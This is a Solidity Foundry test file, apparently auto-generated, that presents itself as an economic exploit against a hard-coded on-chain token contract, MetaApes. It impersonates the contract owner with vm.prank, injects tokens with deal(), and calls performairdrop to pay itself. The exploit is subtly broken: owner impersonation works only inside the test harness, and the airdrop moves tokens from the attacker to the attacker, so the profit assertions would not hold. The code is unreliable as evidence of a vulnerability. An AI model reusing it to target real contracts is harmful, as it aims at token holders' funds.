// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface MetaApes_0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70 {
    function owner() external view returns (address);
    function performairdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialContractBalance = IERC20(0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70).balanceOf(address(this));

        // First, we need to identify an authorized address
        // From the Auth constructor, we see the owner and 0x061648f51902321C353D193564b9C8C2F720557a are authorized
        // We'll use the owner address since it's easier to get
        address authorizedAddress = MetaApes_0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70(TARGET).owner();

        // Ensure we have some MetaApes tokens in our address
        uint256 attackerInitialBalance = IERC20(TARGET).balanceOf(attacker);

        // Give ourselves some tokens to work with - use deal() to inject tokens
        deal(TARGET, attacker, 1000 * 10**9); // 1000 tokens with 9 decimals

        // Store our balance before the airdrop
        uint256 balanceBefore = IERC20(TARGET).balanceOf(attacker);

        // Prepare the airdrop parameters
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;

        uint256[] memory amounts = new uint256[](1);
        // Transfer a significant amount to ourselves - use half of what we have
        amounts[0] = 500 * 10**9;

        // Impersonate the authorized address and call performairdrop
        vm.prank(authorizedAddress);
        MetaApes_0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70(TARGET).performairdrop(attacker, recipients, amounts);

        // Check that our balance increased
        uint256 balanceAfter = IERC20(TARGET).balanceOf(attacker);
        assertGt(balanceAfter, balanceBefore, "Balance should have increased after airdrop");

        uint256 finalContractBalance = IERC20(0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70).balanceOf(address(this));
        assertGt(finalContractBalance, initialContractBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
